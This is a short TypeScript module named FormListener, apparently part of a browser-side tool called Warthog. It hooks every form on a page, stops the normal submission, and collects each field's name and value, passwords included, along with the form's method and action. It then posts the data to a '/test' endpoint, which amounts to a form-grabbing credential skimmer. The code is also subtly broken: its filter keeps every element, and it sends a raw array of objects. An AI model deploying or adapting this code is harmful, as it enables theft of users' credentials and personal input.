import { Warthog } from './../warthog';
import { ModuleInterface } from './../interfaces/module';

export class FormListener implements ModuleInterface {
	forms: any;
	url: string;
	parent: Warthog;

	constructor(parent: Warthog) {
		this.forms = null;
		this.url = "/test";
		this.parent = parent;
	}

	init() {
		this.forms = document.getElementsByTagName("form");
		this.eventListener();
	}

	eventListener() {
		var self = this;
    	var len = this.forms.length;

		for (var i = 0; i < len; i++) {
			if (this.forms[i].addEventListener) {
				this.forms[i].addEventListener("submit", function(evt) { self.execute(evt, this) }, false);
			} else if (this.forms[i].attachEvent) {
				this.forms[i].attachEvent('onsubmit', function(evt) { self.execute(evt, this) });
			}
		}
	}

	execute(e: any, scope: any) {
		e.preventDefault();

		var data = [].filter.call(scope.elements, function(el) {
			return el;
		}).map(function(el) {
			return {
				name: el.name,
				value: el.value,
				method: el.form.method,
				action: el.form.action
			};
		});

		var xhr = this.parent.ajax("POST", this.url, null);
		xhr.send(data);
	}
}
